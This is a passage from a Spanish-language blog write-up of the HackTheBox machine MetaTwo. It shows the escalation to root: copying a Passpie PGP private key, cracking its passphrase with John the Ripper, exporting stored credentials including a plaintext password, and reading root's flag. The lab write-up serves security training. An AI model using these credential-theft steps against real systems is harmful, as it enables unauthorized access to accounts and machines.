<p>Si vemos carpetas ocultas encontramos esto.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>jnelson@meta2:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 52
drwxr-xr-x 6 jnelson jnelson 4096 Mar 29 16:25 <span class="nb">.</span>
drwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
<span class="nt">-rw-r--r--</span> 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwx------ 2 jnelson jnelson 4096 Mar 29 14:22 .gnupg
<span class="nt">-r-xr-x---</span> 1 jnelson jnelson 5243 Mar 29 16:25 .keys
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
<span class="nt">-rw-r--r--</span> 1 jnelson jnelson  807 Jun 26  2022 .profile
drwx------ 2 jnelson jnelson 4096 Mar 29 16:25 .ssh
<span class="nt">-rw-r--r--</span> 1 jnelson jnelson    0 Mar 29 16:25 gpg.john
<span class="nt">-rw-r--r--</span> 1 jnelson jnelson  347 Mar 29 16:38 pass
<span class="nt">-rw-r-----</span> 1 root    jnelson   33 Mar 29 13:39 user.txt
jnelson@meta2:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>La carpeta <code class="language-plaintext highlighter-rouge">.passpie</code> nos llama la atención</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>jnelson@meta2:~/.passpie<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 <span class="nb">.</span>
drwxr-xr-x 6 jnelson jnelson 4096 Mar 29 16:25 ..
<span class="nt">-r-xr-x---</span> 1 jnelson jnelson    3 Jun 26  2022 .config
<span class="nt">-r-xr-x---</span> 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
</pre></td></tr></tbody></table></code></div></div>
<p>A su vez, vemos un archivo <code class="language-plaintext highlighter-rouge">.keys</code></p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>jnelson@meta2:~/.passpie<span class="nv">$ </span><span class="nb">ls</span>  <span class="nt">-la</span>
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 <span class="nb">.</span>
drwxr-xr-x 6 jnelson jnelson 4096 Mar 29 16:25 ..
<span class="nt">-r-xr-x---</span> 1 jnelson jnelson    3 Jun 26  2022 .config
<span class="nt">-r-xr-x---</span> 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
jnelson@meta2:~/.passpie<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>

<p>Copiamos la clave privada. En nuestra máquina ejecutamos</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>❯ gpg2john key <span class="o">&gt;</span> <span class="nb">hash


</span>File key
</pre></td></tr></tbody></table></code></div></div>
<p>Ahora lo intentamos crackear con john.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>gpg, OpenPGP / GnuPG Secret Key <span class="o">[</span>32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>s2k-count<span class="o">)</span> is 65011712 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span><span class="nb">hash </span>algorithm <span class="o">[</span>1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
Cost 3 <span class="o">(</span>cipher algorithm <span class="o">[</span>1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]<span class="o">)</span> is 7 <span class="k">for </span>all loaded hashes
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
blink182         <span class="o">(</span>Passpie<span class="o">)</span>
1g 0:00:00:05 DONE <span class="o">(</span>2023-03-29 15:43<span class="o">)</span> 0.1934g/s 31.72p/s 31.72c/s 31.72C/s ginger..blink182
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></td></tr></tbody></table></code></div></div>
<p>Copiamos la data del archivo <code class="language-plaintext highlighter-rouge">hash</code> y la exportamos con passpie.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>jnelson@meta2:~<span class="nv">$ </span><span class="nb">ls
</span>pass  user.txt
jnelson@meta2:~<span class="nv">$ </span>passpie <span class="nb">export </span>pass 
Passphrase: 
jnelson@meta2:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>Ahora leemos la información.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>jnelson@meta2:~<span class="nv">$ </span><span class="nb">cat </span>pass
credentials:
- comment: <span class="s1">''</span>
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: <span class="o">!!</span>python/unicode <span class="s1">'****************'</span>
- comment: <span class="s1">''</span>
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: <span class="o">!!</span>python/unicode <span class="s1">'Cb4_JmWM8zUZWMu@Ys'</span>
handler: passpie
version: 1.0
jnelson@meta2:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<p>Ahora solo queda hacer un un <code class="language-plaintext highlighter-rouge">su root</code></p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>jnelson@meta2:~<span class="nv">$ </span>su root
Password: 
root@meta2:/home/jnelson# <span class="nb">cat</span> /root/root.txt
49<span class="k">****************************</span>a0
root@meta2:/home/jnelson#
</pre></td></tr></tbody></table></code></div></div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>hackthebox</a>,
      <a href='/categories/machine/'>machine</a>,
      <a href='/categories/writeup/'>writeup</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >hackthebox</a>
      
      <a href="/tags/writeup/"
          class="post-tag no-text-decoration" >writeup</a>
      
      <a href="/tags/easy/"
          class="post-tag no-text-decoration" >easy</a>
      
      <a href="/tags/wordpress/"
          class="post-tag no-text-decoration" >wordpress</a>
      
      <a href="/tags/sql-injection/"
          class="post-tag no-text-decoration" >sql injection</a>
      
      <a href="/tags/virtual-hosting/"
          class="post-tag no-text-decoration" >virtual hosting</a>
      
      <a href="/tags/lfi/"
          class="post-tag no-text-decoration" >LFI</a>
      
      <a href="/tags/xss/"
          class="post-tag no-text-decoration" >XSS</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        Esta entrada está licenciada bajo 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         por el autor.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Compartir</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=MetaTwo+WriteUp+-+H4ckerLite+%7C+Blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fmetatwo-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=MetaTwo+WriteUp+-+H4ckerLite+%7C+Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fmetatwo-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fmetatwo-writeup%2F&text=MetaTwo+WriteUp+-+H4ckerLite+%7C+Blog" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copiar enlace"
        data-title-succeed="¡Enlace copiado!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Actualizado recientemente</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/inject-writeup/">Inject WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/escape-writeup/">Escape WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/broscience-writeup/">BroScience WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/metatwo-writeup/">MetaTwo WriteUp</a></li>
      
        
        
        
      <li><a href="/posts/photobomb-writeup/">Photobomb WriteUp</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/easy/">easy</a>
    
      
      <a class="post-tag" href="/tags/virtual-hosting/">virtual hosting</a>
    
      
      <a class="post-tag" href="/tags/medium/">medium</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
    
      
      <a class="post-tag" href="/tags/ansible-playbook/">Ansible playbook</a>
    
      
      <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contenido</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Lecturas adicionales</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/precious-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673884800"
    data-df="YYYY-MM-DD"
    >
  2023-01-16
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Precious WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Les explicaré cómo comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la es...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/shoppy-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673625600"
    data-df="YYYY-MM-DD"
    >
  2023-01-13
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shoppy WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Les explicaré cómo comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la esc...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/photobomb-writeup/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1675440000"
    data-df="YYYY-MM-DD"
    >
  2023-02-03
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Photobomb WriteUp</h3>
            <div class="text-muted small">
              <p>
                





                Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path Hijacking

Escaneo NMAP

Antes de empezar les recomie...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/encoding-writeup/" class="btn btn-outline-primary"
    prompt="Anterior">
    <p>Encoding WriteUp</p>
  </a>
  

  
  <a href="/posts/broscience-writeup/" class="btn btn-outline-primary"
    prompt="Nuevo">
    <p>BroScience WriteUp</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>



        <!-- The Footer -->

<footer class="row pl-3 pr-3">
  <div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0">
    <div class="footer-left">
      <p class="mb-0">
        © 2023
        <a href="https://twitter.com/mortzelo">H4ckerLite</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Hecho con 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         usando el tema 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
        .

      </p>
    </div>

  </div>

</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/easy/">easy</a>
    
      
      <a class="post-tag" href="/tags/virtual-hosting/">virtual hosting</a>
    
      
      <a class="post-tag" href="/tags/medium/">medium</a>
    
      
      <a class="post-tag" href="/tags/command-injection/">command injection</a>
    
      
      <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
    
      
      <a class="post-tag" href="/tags/ansible-playbook/">Ansible playbook</a>
    
      
      <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Actualizar
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

